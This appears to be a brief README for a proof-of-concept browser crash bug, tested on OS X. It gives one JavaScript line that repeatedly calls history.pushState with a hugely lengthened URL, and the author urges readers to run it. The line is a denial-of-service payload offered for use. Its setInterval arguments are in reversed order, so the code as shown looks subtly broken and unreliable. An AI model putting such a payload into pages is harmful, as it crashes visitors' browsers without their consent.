# safari_crash_poc
This is a POC of my bug that exploits "setInterval" and "history.pushState" to crash possibly multiple browsers, tested on OS X 10.11.6. (Please test it, I need to get an idea of support. I'll patch in your Twitter handle or give you a 3 character available GitHub. )
```javascript
setInterval(350,function f() {history.pushState(0,0,location+"ihateyou".repeat(100000));});
```
# credits
There are none. Yet. 
